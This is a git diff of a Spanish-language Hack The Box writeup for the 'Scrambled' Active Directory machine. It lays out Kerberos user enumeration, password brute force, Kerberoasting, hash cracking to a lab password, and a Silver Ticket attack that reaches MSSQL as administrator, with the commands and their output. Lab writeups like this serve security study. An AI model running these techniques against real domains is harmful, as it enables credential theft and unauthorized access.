@@ -1,11 +1,11 @@
 ---
 layout: single
 title: Scrambled - Hack The Box
-excerpt: "."
-date: 2024-10-01
+excerpt: "Esta es una máquina que nos reta a probar varias formas de poder ganar acceso, pues por un ataque que sufrieron, se desactivó la autenticación NTLM, lo que nos complica la forma de explotar la máquina. Primero analizamos la página web, en donde encontramos información útil como la desactivación de la autenticación NTLM, un usuario, etc. Probamos a enumerar varios servicios, pero el que nos ayuda más es el servicio Kerberos. Al probar varias formas de ganar acceso a la máquina vía Kerberos, optamos por aplicar el Silver Ticket Attack con el que ganaremos acceso al servicio MSSQL como el usuario administrador de ese servicio. Gracias a los privilegios que tenemos, es posible que podamos usar el JuicyPotatoNG, pero si quieres ir por el camino difícil, enumeramos las bases de datos existentes, encontrando un usuario y su contraseña en texto claro. Podemos pivotear a otro usuario utilizando un binario netcat, que podemos cargar desde la sesión de MSSQL, siendo que podemos usarlo usando xp_cmdshell. Una vez dentro del otro usuario, lo enumeramos y encontramos un binario que podemos probar en una máquina virtual Windows y analizar usando DNSpy. Dentro del análisis de DNSpy, encontramos que se está ocupando una serialización y deserialización con data que se envía a un servidor desde este binario. Además, encontramos una backdoor que creó un dev, lo que nos da el acceso al login del binario y nos permite crear órdenes. Nos aprovechamos de esto para entender cómo es que se envía data al servidor, siendo que se usan comandos y la data serializada. Gracias a esto, aplicamos un ataque de deserialización, ocupando la herramienta ysoserial para crear una data en el mismo formato que usa el binario de la máquina, esté almacena un comando que usara el binario netcat, que ya tenemos descargado, para mandar y obtener una sesión como el usuario administrador."
+date: 2024-10-02
 classes: wide
 header:
-  teaser: /assets/images/htb-writeup-/_logo.png
+  teaser: /assets/images/htb-writeup-scrambled/Scrambled.png
   teaser_home_page: true
   icon: /assets/images/hackthebox.webp
 categories:
@@ -13,13 +13,33 @@ categories:
   - Medium Machine
 tags:
   - Windows
+  - Active Directory
+  - SMB
+  - LDAP
+  - Kerberos
+  - MSSQL
+  - Information Leakage
+  - Fuzzing
   - Kerberos Enumeration
-  - 
-  - 
+  - LDAP Enumeration
+  - SMB Enumeration
+  - Password Brute Force
+  - Kerberoasting Attack
+  - Cracking Hash
+  - Silver Ticket Attack
+  - MSSQL Enumeration
+  - Enabling xp_cmdshell (RCE)
+  - User Pivoting
+  - Binary Analysis
+  - DLL Analysis
+  - Analysis with DNSpy
+  - Deserialization Attack
+  - Privesc - Deserialization Attack
+  - OSCP Style
 ---
 ![](/assets/images/htb-writeup-scrambled/Scrambled.png)
 
-texto
+Esta es una máquina que nos reta a probar varias formas de poder ganar acceso, pues por un ataque que sufrieron, se desactivó la **autenticación NTLM**, lo que nos complica la forma de explotar la máquina. Primero analizamos la página web, en donde encontramos información útil como la desactivación de la **autenticación NTLM**, un usuario, etc. Probamos a enumerar varios servicios, pero el que nos ayuda más es el **servicio Kerberos**. Al probar varias formas de ganar acceso a la máquina vía **Kerberos**, optamos por aplicar el **Silver Ticket Attack** con el que ganaremos acceso al **servicio MSSQL** como el **usuario administrador** de ese servicio. Gracias a los privilegios que tenemos, es posible que podamos usar el **JuicyPotatoNG**, pero si quieres ir por el camino difícil, enumeramos las bases de datos existentes, encontrando un usuario y su contraseña en texto claro. Podemos **pivotear** a otro usuario utilizando un **binario netcat**, que podemos cargar desde la sesión de **MSSQL**, siendo que podemos usarlo usando **xp_cmdshell**. Una vez dentro del otro usuario, lo enumeramos y encontramos un binario que podemos probar en una **máquina virtual Windows** y analizar usando **DNSpy**. Dentro del análisis de **DNSpy**, encontramos que se está ocupando una **serialización y deserialización** con data que se envía a un servidor desde este binario. Además, encontramos una **backdoor** que creo un **dev**, lo que nos da el acceso al login del binario y nos permite crear órdenes. Nos aprovechamos de esto para entender cómo es que se envía data al servidor, siendo que se usan comandos y la data serializada. Gracias a esto, aplicamos un **ataque de deserialización**, ocupando la herramienta **ysoserial** para crear una data en el mismo formato que usa el binario de la máquina, esté almacena un comando que usara el **binario netcat**, que ya tenemos descargado, para mandar y obtener una sesión como el **usuario administrador**.
 
 Herramientas utilizadas:
 * *ping*
@@ -28,11 +48,42 @@ Herramientas utilizadas:
 * *whatweb*
 * *wfuzz*
 * *gobuster*
-* 
-* 
-* 
-* 
-* 
+* *crackmapexec*
+* *smbclient*
+* *smbmap*
+* *ldapsearch*
+* *kerbrute_linux_amd64*
+* *impacket-smbclient*
+* *exiftool*
+* *impacket-GetUserSPNs*
+* *JohnTheRipper*
+* *impacket-mssqlclient*
+* *impacket-getTGT*
+* *export*
+* *echo*
+* *tr*
+* *impacket-getPac*
+* *impacket-ticketer*
+* *xp_cmdshell*
+* *nc.exe*
+* *curl*
+* *locate*
+* *python3*
+* *rlwrap*
+* *nc*
+* *krb5.conf*
+* *evil-winrm*
+* *mkdir*
+* *script-blocks*
+* *New-Object*
+* *Invoke-Command*
+* *pwsh*
+* *Enter-PSSession*
+* *máquina virtual Windows*
+* *openvpn client*
+* *nc*
+* *dnspy.exe*
+* *ysoserial.exe*
 
 
 <br>
@@ -52,25 +103,32 @@ Herramientas utilizadas:
 				<li><a href="#fuzz">Fuzzing</a></li>
 				<li><a href="#SMB">Enumeración de Servicio SMB y LDAP</a></li>
 				<li><a href="#kerberos">Enumeración de Servicio Kerberos</a></li>
-				<li><a href="#smbclient">Probando Contraseña Encontrada con impacket-smbclient</a></li>
+				<ul>
+					<li><a href="#bruteF">Aplicando Fuerza Bruta con Kerbrute para Encontrar Contraseña Valida</a></li>
+				</ul>
+				<li><a href="#ksimpson">Probando Contraseña de Usuario ksimpson con impacket-smbclient para Entrar a Servicio SMB vía Kerberos</a></li>
 			</ul>
 		<li><a href="#Explotacion">Explotación de Vulnerabilidades</a></li>
 			<ul>
 				<li><a href="#kerberoasting">Aplicando Ataque Kerberoasting (Fallo en la Autenticación)</a></li>
-				<li><a href="#ticketTGT">Generando TGT para Autenticación en MSSQL vía Kerberos con impacket-getTGT (Fallo)</a></li>
-				<li><a href="#silver">Aplicando Silver Ticket Attack</a></li>
-				<li><a href="#MSSQL">Enumeración de MSSQL y Obteniendo Shell Interactiva</a></li>
+				<li><a href="#ticketTGT">Generando TGT para Autenticación en Servicio MSSQL vía Kerberos con impacket-getTGT (Fallo)</a></li>
+				<li><a href="#silver">Aplicando Silver Ticket Attack y Conectandonos a Servicio MSSQL</a></li>
+				<li><a href="#MSSQL">Enumeración de Servicio MSSQL y Obteniendo Shell Interactiva</a></li>
 				<ul>
-					<li><a href="#xpcmd">Activando xp_cmdshell en MSSQL</a></li>
+					<li><a href="#xpcmd">Activando xp_cmdshell en Servicio MSSQL</a></li>
 					<li><a href="#binarioNC">Obteniendo Shell con Binario nc.exe</a></li>
 				</ul>
 			</ul>
 		<li><a href="#Post">Post Explotación</a></li>
 			<ul>
-				<li><a href="#"></a></li>
-				<li><a href="#"></a></li>
-				<li><a href="#"></a></li>
-				<li><a href="#"></a></li>
+				<li><a href="#Pivot">Aplicando User Pivoting para Convertirnos en Usuario MiscSvc</a></li>
+				<ul>
+					<li><a href="#evilWinRM">Utilizando Evil-WinRM para Autenticarnos como Usuario MiscSvc vía Kerberos</a></li>
+	                                <li><a href="#blocks">Utilizando Script-Blocks y cmdlet Invoke-Command de PowerShell para Obtener Shell como Usuario MiscSvc</a></li>
+					<li><a href="#PSSesion">Utilizando cmdlet Enter-PSSession para Obtener Sesión en PowerShell como Usuario MiscSvc (Fallo para Mi)</a></li>
+				</ul>
+				<li><a href="#DNSpy">Analizando Binario y DLL con DNSpy</a></li>
+				<li><a href="#ysoserial">Aplicando Ataque de Deserialización con ysoserial</a></li>
 			</ul>
 		<li><a href="#Links">Links de Investigación</a></li>
 	</ul>
@@ -101,7 +159,7 @@ PING 10.10.11.168 (10.10.11.168) 56(84) bytes of data.
 4 packets transmitted, 4 received, 0% packet loss, time 3010ms
 rtt min/avg/max/mdev = 68.697/82.261/94.072/11.596 ms
 ```
-Por el TTL sabemos que la máquina usa Windows, hagamos los escaneos de puertos y servicios.
+Por el TTL sabemos que la máquina usa **Windows**, hagamos los escaneos de puertos y servicios.
 
 <h2 id="Puertos">Escaneo de Puertos</h2>
 
@@ -177,7 +235,7 @@ Nmap done: 1 IP address (1 host up) scanned in 54.88 seconds
 | *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
 | *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |
 
-Vemos demasiados puertos abiertos, entre ellos se ve el puerto 88 (que es del **servicio Kerberos**) por lo que ya nos damos una idea de a que nos enfrentamos.
+Vemos demasiados puertos abiertos, entre ellos se ve el **puerto 88** (que es del **servicio Kerberos**), por lo que ya nos damos una idea de a qué nos enfrentamos.
 
 <h2 id="Servicios">Escaneo de Servicios</h2>
 
@@ -304,11 +362,11 @@ Nmap done: 1 IP address (1 host up) scanned in 195.82 seconds
 | *-p*       | Para indicar puertos específicos. |
 | *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |
 
-Esta más que claro que nos enfrentamos a un **Directorio Activo (AD)**.
+Está más que claro que nos enfrentamos a un **Directorio Activo (AD)**.
 
-Observa que nos muestra un dominio llamado **scrm.local** y un DNS llamado **dc1.scrm.local**, registralos en tu **/etc/hosts**.
+Observa que nos muestra un dominio llamado **scrm.local** y un DNS llamado **dc1.scrm.local**, regístralos en tu **/etc/hosts**.
 
-También veo que esta activo el **puerto 80**, por lo que hay una página web que podemos revisar, ahí empezaremos.
+También veo que está activo el **puerto 80**, por lo que hay una página web que podemos revisar, ahí empezaremos.
 
 
 <br>
@@ -334,38 +392,40 @@ Veamos que nos reporta **Wappalizer**:
 <img src="/assets/images/htb-writeup-scrambled/Captura2.png">
 </p>
 
-Esta ocupando un **servidor IIS** y es lo único que veo interesante, pero de momento no nos ayuda mucho esta información.
+Está ocupando un **servidor IIS** y es lo único que veo interesante, pero de momento no nos ayuda mucho esta información.
 
 Probemos con **whatweb** para ver si nos reporta algo más:
 ```bash
 whatweb http://10.10.11.168
 http://10.10.11.168 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.10.11.168], JQuery, Microsoft-IIS[10.0], Script, Title[Scramble Corp Intranet]
 ```
-Nada, bueno analicemos que nos podemos encontrar en la página web.
+Nada, analicemos qué nos podemos encontrar en la página web.
 
-Navegando un poco, si vamos a la ruta `/support.html` a la que puedes entrar desde el bóton **IT Services**, nos muestra un mensaje importante:
+Navegando un poco, si vamos a la ruta `/support.html` a la que puedes entrar desde el botón **IT Services**, nos muestra un mensaje importante:
 
 <p align="center">
 <img src="/assets/images/htb-writeup-scrambled/Captura3.png">
 </p>
 
-Resulta que muchas herramientas que ocupamos, necesitan la **autenticación NTLM** para funcionar, por lo que esto nos puede dar problemas contra está máquina.
+Resulta que muchas herramientas que ocupamos, necesitan la **autenticación NTLM** para funcionar, por lo que esto nos puede dar problemas contra esta máquina.
 
 Tengamos presente este mensaje de ahora en adelante.
 
-Si vamos a la ruta `/supportrequest.html` a la que puedes entrar desde el bóton **Contacting IT Support**, nos explican que al mandar un correo de soporte, debemos incluir los datos de nuestra red y explican como hacerlo, lo curioso es que podemos ver un usuario llamado **ksimpson**, guardemos este usuario para más adelante:
+Si vamos a la ruta `/supportrequest.html` a la que puedes entrar desde el botón **Contacting IT Support**, nos explican que al mandar un correo de soporte, debemos incluir los datos de nuestra red y explican cómo hacerlo. Lo curioso, es que podemos ver un usuario llamado **ksimpson**.
+
+Guardemos este usuario para más adelante:
 
 <p align="center">
 <img src="/assets/images/htb-writeup-scrambled/Captura4.png">
 </p>
 
-Por último, si vamos a la ruta `/salesorders.html` a la que puedes entrar desde el bóton **Report a problem with the sales orders app**, nos explican como aplicar un troubleshooting con la aplicación que usan en sus sistemas, lo importante aquí es que podemos el dominio del **AD** (que ya habiamos visto en el escaneo de servicios) y el puerto en donde esta activa la aplicación:
+Por último, si vamos a la ruta `/salesorders.html` a la que puedes entrar desde el botón **Report a problem with the sales orders app**, nos explican como aplicar un troubleshooting con la aplicación que usan en sus sistemas, lo importante aquí es que podemos ver el dominio del **AD** (que ya habíamos visto en el escaneo de servicios) y el puerto en donde está activa la aplicación:
 
 <p align="center">
 <img src="/assets/images/htb-writeup-scrambled/Captura5.png">
 </p>
 
-Hemos encontrado información bastante útil en esta página, solamente apliquemos **Fuzzing** por si hay algo que se nos este escapando.
+Hemos encontrado información bastante útil en esta página, solamente apliquemos **Fuzzing** por si hay algo que se nos esté escapando.
 
 <h2 id="fuzz">Fuzzing</h2>
 
@@ -379,12 +439,12 @@ Target: http://10.10.11.168/FUZZ
 Total requests: 220545
 
 =====================================================================
-ID           Response   Lines    Word       Chars       Payload                                                                                                                                         
+ID           Response   Lines    Word       Chars       Payload                                                     
 =====================================================================
 
-000000002:   301        1 L      10 W       150 Ch      "images"                                                                                                                                        
-000000189:   301        1 L      10 W       150 Ch      "Images"                                                                                                                                        
-000000277:   301        1 L      10 W       150 Ch      "assets"                                                                                                                                        
+000000002:   301        1 L      10 W       150 Ch      "images"                         
+000000189:   301        1 L      10 W       150 Ch      "Images"                                                     
+000000277:   301        1 L      10 W       150 Ch      "assets"                                                        
 000003659:   301        1 L      10 W       150 Ch      "IMAGES"
 ```
 
@@ -444,7 +504,7 @@ Probemos primero con **crackmapexec**:
 crackmapexec smb 10.10.11.168
 SMB         10.10.11.168    445    10.10.11.168     [*]  x64 (name:10.10.11.168) (domain:10.10.11.168) (signing:True) (SMBv1:False)
 ```
-Observa como no nos reporta nada del **servicio SMB**, salvo que no usa el **SMBv1** y que esta activada la autentucación.
+Observa cómo no nos reporta nada del **servicio SMB**, salvo que no usa el **SMBv1** y que está activada la autenticación.
 
 Veamos si podemos listar los archivos compartidos con **smbclient**:
 ```bash
@@ -474,7 +534,7 @@ SMBMap - Samba Share Enumerator v1.10.4 | Shawn Evans - ShawnDEvans@gmail.com<ma
 [*] Established 0 SMB connections(s) and 0 authenticated session(s)                                                          
 [*] Closed 0 connections
 ```
-Nada, no pudimos hacer algo contra el **servicio SMB** con nuestras principales herramientas.
+Nada, no pudimos hacer algo contra el **servicio SMB** con nuestras herramientas principales.
 
 Probemos a enumerar el **servicio LDAP**.
 
@@ -502,7 +562,7 @@ result: 0 Success
 # numResponses: 2
 # numEntries: 1
 ```
-Bien, confirmamos que el dominio es **scrm.local** y también tenemos el DNS **dc1.scrm.local**, que por lo que entiendo este es el servidor del dominio, osea, la controladora del dominio.
+Bien, confirmamos que el dominio es **scrm.local** y también tenemos el DNS **dc1.scrm.local**, que por lo que entiendo, este es el servidor del dominio, ósea, la controladora del dominio.
 
 Vemos si podemos obtener más información del dominio:
 ```bash
@@ -528,11 +588,13 @@ Lo dejaremos hasta aquí y vamos a enumerar el **servicio Kerberos**.
 
 <h2 id="kerberos">Enumeración de Servicio Kerberos</h2>
 
-Vamos a empezar por comprobar si el usuario que encontramos si existe.
+Vamos a empezar por comprobar si el usuario que encontramos sí existe.
 
 Para esto, usaremos la herramienta **Kerbrute** que ya hemos usado en la **máquina Support**.
 
-Guarda en un archivo de texto el **usuario ksimpson** para que lo podamos usar en la herramienta, puedes agregar otros usuarios randoms si lo deseas:
+Guarda en un archivo de texto el **usuario ksimpson** para que lo podamos usar en la herramienta.
+
+Puedes agregar otros usuarios randoms si lo deseas:
 ```bash
 cat users
 ksimpson
@@ -546,7 +608,7 @@ nano /etc/hosts
 10.10.11.168 scrm.local dc1.scrm.local
 ```
 
-Usemos **Kerbrute**, recuerda que debemos especificar el ataque (que sería **username**, para enumerar usuarios), la IP con el parámetro **--dc** y el dominio con el parámetro **-d** (usaremos el dominio scrm.local):
+Usemos **Kerbrute** para la enumeración, recuerda que debemos especificar el ataque (que sería **username**, para enumerar usuarios), la IP con el parámetro **--dc** y el dominio con el parámetro **-d** (usaremos el dominio scrm.local):
 ```bash
 ./kerbrute_linux_amd64 userenum --dc 10.10.11.168 -d scrm.local users
     __             __               __     
@@ -565,12 +627,12 @@ Version: v1.0.3 (9dad6e1) - 10/01/24 - Ronnie Flathers @ropnop
 ```
 Excelente, si existe.
 
-Ahora, probemos que usuarios podremos obtener.
+Ahora, probemos qué usuarios podremos obtener.
 
 En la **máquina Support** usamos un wordlists de **SecLists**, pero también existen wordlists específicos para **AD** que puedes encontrar en el siguiente link:
 * <a href="https://github.com/attackdebris/kerberos_enum_userlists" target="_blank">Kerberos Username Enumeration – Top 500 Common Usernames</a>
 
-Probemos ese wordlists y veamos que usuarios podemos encontrar:
+Probemos ese wordlists y veamos qué usuarios podemos encontrar:
 ```bash
 ./kerbrute_linux_amd64 userenum --dc 10.10.11.168 -d scrm.local /opt/kerberos_enum_userlists/A-ZSurnames.txt
     __             __               __     
@@ -591,9 +653,13 @@ Version: v1.0.3 (9dad6e1) - 10/01/24 - Ronnie Flathers @ropnop
 2024/10/01 14:18:38 >  [+] VALID USERNAME:       SJENKINS@scrm.local
 2024/10/01 14:19:08 >  Done! Tested 13000 usernames (5 valid) in 96.713 seconds
 ```
-Muy bien, tenemos 4 usuarios más del que ya conociamos, copialos en un archivo de texto en minusculas.
+Muy bien, tenemos 4 usuarios más del que ya conocíamos, cópialos en un archivo de texto en minúsculas.
 
-Si bien sabemos que algunas contraseñas pueden ser usadas en distintos usuarios, también debemos tener encuenta que los mismos nombres de los usuarios, los pueden usar como contraseña del mismo usuario.
+<br>
+
+<h3 id="bruteF">Aplicando Fuerza Bruta con Kerbrute para Encontrar Contraseña Válida</h3>
+
+Si bien sabemos que algunas contraseñas pueden ser usadas en distintos usuarios, también debemos tener en cuenta que los mismos nombres de los usuarios, los pueden usar como contraseña del mismo usuario.
 
 Podemos comprobar si algún nombre de usuario, sirve como contraseña del mismo usuario o de otros utilizando el **ataque bruteuser de Kerbrute**.
 
@@ -672,7 +738,7 @@ Version: v1.0.3 (9dad6e1) - 10/01/24 - Ronnie Flathers @ropnop
 ```
 Muy bien, tenemos la contraseña para el usuario **ksimpson** del **servicio Kerberos**.
 
-<h2 id="">Probando Contraseña Encontrada con impacket-smbclient</h2>
+<h2 id="ksimpson">Probando Contraseña de Usuario ksimpson con impacket-smbclient para Entrar a Servicio SMB vía Kerberos</h2>
 
 La herramienta **smbclient** que se incluye en **impacket**, nos puede servir para autenticarnos en el **servicio SMB vía Kerberos**.
 
@@ -686,7 +752,7 @@ Type help for list of commands
 \#
 ```
 
-Si escribimos `help`, veremos que comandos podemos usar:
+Si escribimos `help`, veremos qué comandos podemos usar:
 ```bash
 # help
 
@@ -734,9 +800,9 @@ Sales
 SYSVOL
 ```
 
-Vemos varios, pero unicamente podremos entrar en el **directorio Public**.
+Vemos varios, pero únicamente podremos entrar en el **directorio Public**.
 
-Entremos para ver que hay dentro:
+Entremos para ver qué hay dentro:
 ```bash
 # use Public
 # ls
@@ -746,7 +812,7 @@ drw-rw-rw-          0  Thu Nov  4 16:23:19 2021 ..
 ```
 Encontramos un PDF. 
 
-Descarguemoslo y veamos si podemos encontrar algo en sus metadatos:
+Descarguémoslo y veamos si podemos encontrar algo en sus metadatos:
 ```bash
 # get Network Security Changes.pdf
 # exit
@@ -774,19 +840,19 @@ Modify Date                     : 2021:11:04 22:20:49+00:00
 ```
 Nada útil.
 
-Abramos el PDF para ver de que es:
+Abramos el PDF para ver que es:
 
 <p align="center">
 <img src="/assets/images/htb-writeup-scrambled/Captura6.png">
 </p>
 
-Hay varios puntos que nos menciona y que son pistas sobre como avanzar de ahora en adelante.
+Hay varios puntos que nos menciona y que son pistas sobre cómo avanzar de ahora en adelante.
 
-* Primero: La **autenticación NTLM** se desactivo porque un atacante uso el **ataque NTLM Relay**, en toda la red interna no se puede usar esta autenticación.
-* Segundo: Nos menciona que unicamente se pueden autenticar usando el **servicio Kerberos**, ya que piensan que no es posible hackearlo. Para autenticarse, necesitan el **dominio (scrm.local)**, su usuario y el nombre del servidor al que tengan acceso.
+* Primero: La **autenticación NTLM** se desactivó porque un atacante usó el **ataque NTLM Relay**, en toda la red interna no se puede usar esta autenticación.
+* Segundo: Nos menciona que únicamente se pueden autenticar usando el **servicio Kerberos**, ya que piensan que no es posible hackearlo. Para autenticarse, necesitan el **dominio (scrm.local)**, su usuario y el nombre del servidor al que tengan acceso.
 * Tercero: El atacante podía obtener las credenciales almacenadas de una base de datos de **SQL Server (MSSQL)** que usa su **software de HR**, por esto quitaron el acceso al **SQL Server**, menos a los administradores de red.
 
-Ya con esto, nos podemos dar una idea de como proceder, que sería atacando el **servicio Kerberos**.
+Ya con esto, nos podemos dar una idea de cómo proceder, que sería atacando el **servicio Kerberos**.
 
 
 <br>
@@ -800,9 +866,11 @@ Ya con esto, nos podemos dar una idea de como proceder, que sería atacando el *
 
 <h2 id="kerberoasting">Aplicando Ataque Kerberoasting (Fallo en la Autenticación)</h2>
 
-Como ya tenemos un usuario y contraseña valido, podemos aplicar el **ataque Kerberoasting**. Este mismo ataque, ya lo hemos aplicado en la **máquina Active** para escalar privilegios.
+Como ya tenemos un usuario y contraseña válido, podemos aplicar el **ataque Kerberoasting**. Este mismo ataque, ya lo hemos aplicado en la **máquina Active** para escalar privilegios.
 
-Utilicemos la herramienta **GetUserSPNs.py de Impacket** para realizar el ataque, debemos indicar el dominio junto al usuario y contraseña, el servidor del dominio e indicar que es por **Kerberos**:
+Utilicemos la herramienta **GetUserSPNs.py de Impacket** para realizar el ataque.
+
+Debemos indicar el dominio junto al usuario y contraseña, el servidor del dominio e indicar que es por **Kerberos**:
 ```bash
 impacket-GetUserSPNs scrm.local/ksimpson:ksimpson -dc-host dc1.scrm.local -k
 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
@@ -815,7 +883,7 @@ MSSQLSvc/dc1.scrm.local:1433  sqlsvc            2021-11-03 10:32:02.351452  2024
 MSSQLSvc/dc1.scrm.local       sqlsvc            2021-11-03 10:32:02.351452  2024-10-01 12:28:10.946619
 ```
 
-Hemos generado el ticket, ahora debemos obtener el hash del ticket generado, para esto debemos indicarselo con el parámetro `-request`:
+Hemos generado el ticket, ahora debemos obtener el hash del ticket generado, para esto debemos indicárselo con el parámetro `-request`:
 ```bash
 impacket-GetUserSPNs scrm.local/ksimpson:ksimpson -dc-host dc1.scrm.local -k -request
 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
@@ -832,6 +900,7 @@ $krb5tgs$23$*sqlsvc$SCRM.LOCAL$scrm.local/sqlsvc*...
 ...
 ...
 ```
+Obtuvimos el hash e información extra como el **Service Principal Name (SPN)**, guardalo porque nos servira más adelante.
 
 Muy bien, copia y pega el hash en un archivo para que podamos crackearlo con **JohnTheRipper**:
 ```bash
@@ -847,7 +916,9 @@ Session completed.
 ```
 Tenemos la contraseña del **usuario sqlsvc** en texto claro y es claro que es para el **servicio MSSQL**.
 
-Podemos comprobar si la contraseña funciona con la herramienta **impacket-mssqlclient**, debemos indicarle el dominio seguido del **usuario sqlsvc** junto a su contraseña y la IP de la máquina víctima:
+Podemos comprobar si la contraseña funciona con la herramienta **impacket-mssqlclient**.
+
+Debemos indicarle el dominio seguido del **usuario sqlsvc** junto a su contraseña y la IP de la máquina víctima:
 ```bash
 impacket-mssqlclient scrm.local/sqlsvc:Pegasus60@10.10.11.168
 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
@@ -855,7 +926,7 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 [*] Encryption required, switching to TLS
 [-] ERROR(DC1): Line 1: Login failed for user 'sqlsvc'.
 ```
-No nos dejo loguearnos.
+No nos dejó loguearnos.
 
 Vamos a usar el parámetro `-windows-auth` para tratar de evitar problemas con la autenticación de **Windows**:
 ```bash
@@ -866,11 +937,11 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 [-] ("Unpacked data doesn't match constant value 'b'\\x14H\\x00\\x00\\x01\\x0ef\\x00'' should be ''NTLMSSP\\x00''", 'When unpacking field \' | "NTLMSSP\x00 | b\'\\x14H\\x00\\x00\\x01\\x0ef\\x00L\\x00o\\x00g\\x00i\\x00n\\x00 \\x00f\\x00a\\x00i\\x00l\\x00e\\x00d\\x00.\\x00 \\x00T\\x00h\\x00e\\x00 \\x00l\\x00o\\x00g\\x00i\\x00n\\x00 \\x00i\\x00s\\x00 \\x00f\\x00r\\x00o\\x00m\\x00 \\x00a\\x00n\\x00 \\x00u\\x00n\\x00t\\x00r\\x00u\\x00s\\x00t\\x00e\\x00d\\x00 \\x00d\\x00o\\x00m\\x00a\\x00i\\x00n\\x00 \\x00a\\x00n\\x00d\\x00 \\x00c\\x00a\\x00n\\x00n\\x00o\\x00t\\x00 \\x00b\\x00e\\x00 \\x00u\\x00s\\x00e\\x00d\\x00 \\x00w\\x00i\\x00t\\x00h\\x00 \\x00I\\x00n\\x00t\\x00e\\x00g\\x00r\\x00a\\x00t\\x00e\\x00d\\x00 \\x00a\\x00u\\x00t\\x00h\\x00e\\x00n\\x00t\\x00i\\x00c\\x00a\\x00t\\x00i\\x00o\\x00n\\x00.\\x00\\x03D\\x00C\\x001\\x00\\x00\\x01\\x00\\xfd\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\'[:8]\'')
 ```
 
-Tampoco nos dejo y es por el hecho de que esta desactivada la **autenticación NTLM**.
+Tampoco nos dejó y es por el hecho de que está desactivada la **autenticación NTLM**.
 
-<h2 id="ticketTGT">Generando TGT para Autenticación en MSSQL vía Kerberos con impacket-getTGT (Fallo)</h2>
+<h2 id="ticketTGT">Generando TGT para Autenticación en Servicio MSSQL vía Kerberos con impacket-getTGT (Fallo)</h2>
 
-Podemos intentar generar un **TGT** que nos sirva para autenticarnos en el **servicio Kerberos**, esto lo realizaremos con la herramienta **impacket-getTGT**.
+Podemos intentar generar un **TGT** que nos sirva para autenticarnos en el **servicio Kerberos**. Esto lo realizaremos con la herramienta **impacket-getTGT**.
 
 Solo hay que indicarle el dominio y el usuario con su contraseña:
 ```bash
@@ -880,7 +951,7 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 [*] Saving ticket in sqlsvc.ccache
 ```
 
-Exportamos el **archivo ccache** que se genero en la **variable de entorno KRB5CCNAME**:
+Exportamos el **archivo ccache** que se generó en la **variable de entorno KRB5CCNAME**:
 ```bash
 export KRB5CCNAME=sqlsvc.ccache
 ```
@@ -913,9 +984,9 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 
 Nada tampoco, lo que seguiría es aplicar un **Silver Ticket Attack**.
 
-<h2 id="silver">Aplicando Silver Ticket Attack</h2>
+<h2 id="silver">Aplicando Silver Ticket Attack y Conectandonos a Servicio MSSQL</h2>
 
-¿Qué es un Silver Ticket Attack?
+¿Qué es un **Silver Ticket Attack**?
 
 | **Silver Ticket Attack** |
 |:-----------:|
@@ -936,19 +1007,19 @@ En resumen, para aplicar este ataque necesitamos los siguientes datos:
 * El Dominio del AD
 * Eñ servidor del dominio
 
-Nosotros ya tenemos el usuario y contraseña valido, el SPN, el dominio del AD y el servidor del dominio.
+Nosotros ya tenemos el usuario y contraseña válido, el SPN, el dominio del AD y el servidor del dominio.
 
 Obtengamos el **NTLM Hash** de la contraseña del **usuario sqlsvc** con la siguiente página:
 <a href="https://codebeautify.org/ntlm-hash-generator" target="_blank">NTLM Hash Generator</a>
 
-Transformalo a minuscula:
+Transfórmalo a minúscula:
 ```bash
 echo "B999A..." | tr '[A-Z]' '[a-z]'
 b999a...
 ```
 Guarda este **NTLM Hash**.
 
-Para obtener el **dominio SID**, vamos a ocupar la herramienta **impacket-getPac**, debemos indicarle el Administrador con `-targetUser`, luego dominio y el usuario y contraseña:
+Para obtener el **dominio SID**, vamos a ocupar la herramienta **impacket-getPac**. Debemos indicarle el administrador con `-targetUser`, luego el dominio y el usuario y contraseña:
 ```bash
 impacket-getPac -targetUser Administrator scrm.local/sqlsvc:Pegasus60
 KERB_VALIDATION_INFO 
@@ -1018,9 +1089,9 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 SQL (SCRM\administrator  dbo@master)> 
 ```
 
-<h2 id="MSSQL">Enumeración de MSSQL y Obteniendo Shell Interactiva</h2>
+<h2 id="MSSQL">Enumeración de Servicio MSSQL y Obteniendo Shell Interactiva</h2>
 
-Estamos dentro del **servicio MSSQL** como administrador, vamos a empezar a enumerar lo que este almacenado aquí.
+Estamos dentro del **servicio MSSQL** como administrador, vamos a empezar a enumerar lo que esté almacenado aquí.
 
 Empecemos por las bases de datos, veamos si existen más:
 ```sql
@@ -1070,11 +1141,11 @@ EmployeeID   TimeStart   TimeEnd
 ----------   ---------   -------
 ```
 
-Encontramos la contraseña de un usuario llamado **MiscSvc** y esta en texto claro, parece que menciona que es el usuario y contraseña del **servicio LDAP**, pero seguramente sirve para otros servicios.
+Encontramos la contraseña de un usuario llamado **MiscSvc** y está en texto claro, parece que menciona que es el usuario y contraseña del **servicio LDAP**, pero seguramente sirve para otros servicios.
 
-Guardala, ya que la usaremos más adelante.
+Guárdala, ya que la usaremos más adelante.
 
-Obtengamos una shell interactiva, para hacer esto, podriamos cargar un binario de **netcat** al directorio **/Temp** de la máquina víctima y después indicarle que ejecute una cmd en una **netcat** que levantemos.
+Obtengamos una shell interactiva. Para hacer esto, podríamos cargar un binario de **netcat** al directorio **/Temp** de la máquina víctima y después indicarle que ejecute una cmd en una **netcat** que levantemos.
 
 Para realizar esto, vamos a usar la herramienta **xp_cmdshell** que tiene el **servicio MSSQL**.
 
@@ -1084,15 +1155,15 @@ Para realizar esto, vamos a usar la herramienta **xp_cmdshell** que tiene el **s
 
 <br>
 
-<h3 id="xpcmd">Activando xp_cmdshell en MSSQL</h3>
+<h3 id="xpcmd">Activando xp_cmdshell en Servicio MSSQL</h3>
 
-Revisemos si esta activa:
+Revisemos si está activa:
 ```sql
